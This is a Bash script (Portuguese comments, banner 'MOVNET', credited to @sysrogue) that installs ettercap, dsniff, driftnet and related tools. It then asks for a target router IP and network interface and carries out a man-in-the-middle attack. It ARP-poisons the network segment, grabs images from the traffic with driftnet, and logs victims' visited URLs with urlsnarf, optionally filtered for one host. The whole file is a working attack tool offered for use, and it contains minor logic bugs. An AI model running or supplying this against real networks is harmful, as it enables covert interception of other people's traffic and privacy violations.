#!/bin/bash
#--------------------------------------------------------------------------------------------------------------
                            #Verificação do tipo de usuário, se é root ou não.

[ $(id -u) -ne 0 ] && { echo -e "root?"; sudo mitm.sh ; exit ;} || echo -e "Ok"
#--------------------------------------------------------------------------------------------------------------
                           #aqui inicia a verificação de pacotes para instalação


echo -e "Analyzing packages...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
if [ -n "$pacote" ] ;
  sleep 1
 then
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "A aplicação ettercap-text-only será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "A aplicação Urlsnarf será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "A aplicação Driftnet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "A aplicação Figlet será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install figlet
fi
pacote=$(dpkg --get-selections | grep dialog )
if [ -n "$pacote" ] ;
 then 
     echo -e "Dialog ---------------------------------------- OK\n"
 else
     echo -e "Dialog ----------------------------- Nao instalado\n"
     echo "A aplicação Dialog será instalado, tecle [ENTER] para continuar."
     read
     sudo apt-get install dialog
fi
clear

#--------------------------------------------------------------------------------------------------------------
                                #inicio da coleta de dados

sleep 1
figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @sysrogue\n"
echo "------------------------------------------"
    echo
    echo -n "Find the IP of the target router, y/n? "
 read v0
if [ "$v0" = y ] ;
 then 
    route
    echo "------------------------------------------"
    echo
    echo "Enter the target IP."
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
   else
    echo
    echo "------------------------------------------"
   echo "Enter the target IP"
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
fi    
    echo
    echo "Enter the network interface used"
    echo -n ">>" ;read int
    echo "------------------------------------------"
     echo -n "Insert target host, y/n? "
     read V

#--------------------------------------------------------------------------------------------------------------
                                      #inicio do ataque MITM

if [[ "$V" = y ]]; then
    echo -n ">> " ; read alvo
    driftnet -i $int&
    xterm -e ./target.sh&
    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
    urlsnarf -i $int | grep $alvo > log.txt
elif [[ "$V" = n ]]; then
    driftnet -i $int&
    xterm -e ./target.sh&
    xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
    urlsnarf -i $int > log.txt
else
  echo "------------------------------------------"
  echo "Unknown entry, run the script again. y/n?"
  echo -n ">>" ; read v1
  if [[ "$v1" = s ]]; then
    ./mitm.sh
  else
    exit
fi
fi
